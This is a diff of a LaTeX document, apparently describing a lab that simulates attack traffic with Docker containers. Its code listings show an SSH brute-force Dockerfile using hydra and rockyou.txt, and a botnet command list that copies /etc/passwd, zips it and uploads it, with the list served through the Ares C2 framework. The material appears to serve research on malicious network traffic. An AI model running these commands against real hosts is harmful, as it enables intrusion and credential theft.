@@ -185,10 +185,11 @@ ENV command="echo test; mkdir test; rmdir test;"
 RUN apt-get update && \ 
     apt-get install -y sshpass
     
-ENTRYPOINT while true; do sshpass -p "technikum" \ 
-			ssh -o StrictHostKeyChecking=no \
-			"technikum@${targetip}" ${command}; \
-			sleep 5; done
+ENTRYPOINT  while true; \
+            do sshpass -p "technikum" \
+            ssh -o StrictHostKeyChecking=no \ 
+            "technikum@${targetip}" ${command}; \
+            sleep 5; done
 \end{lstlisting}
 
 \subsubsection{Malicious client}
@@ -201,7 +202,8 @@ FROM c4nc/kalibase:latest
 RUN gunzip /usr/share/wordlists/rockyou.txt.gz
 
 ENTRYPOINT ["hydra", "-l", "root", \
-            "-P", "/usr/share/wordlists/rockyou.txt", \
+            "-P", \
+            "/usr/share/wordlists/rockyou.txt", \
             "192.168.0.10", "-t", "4", "ssh"]
 \end{lstlisting}
 
@@ -213,7 +215,8 @@ The server controls the agents with a list of commands. The server send these co
 
 \begin{lstlisting}[basicstyle=\footnotesize]
 apt -y install tor
-download http://ipv4.download.thinkbroadband.com/5MB.zip
+download \
+  http://ipv4.download.thinkbroadband.com/5MB.zip
 screenshot
 mkdir -p /tmp/zzz
 cp /etc/passwd /tmp/zzz/
@@ -222,7 +225,8 @@ zip zzz.zip /tmp/zzz/
 upload zzz.zip
 rm -rf /tmp/zzz zzz.zip 5MB.zip
 apt -y remove tor
-download http://ipv4.download.thinkbroadband.com/100MB.zip
+download \
+  http://ipv4.download.thinkbroadband.com/100MB.zip
 apt -y install curl wget netcat
 
 \end{lstlisting}
@@ -241,7 +245,8 @@ RUN apt-get update && \
       python-pip && \
     apt-get clean all
 
-RUN git clone https://github.com/sweetsoftware/Ares.git && \
+RUN git clone \ 
+    https://github.com/sweetsoftware/Ares.git && \
     cd Ares && \
     pip install -r requirements.txt
 
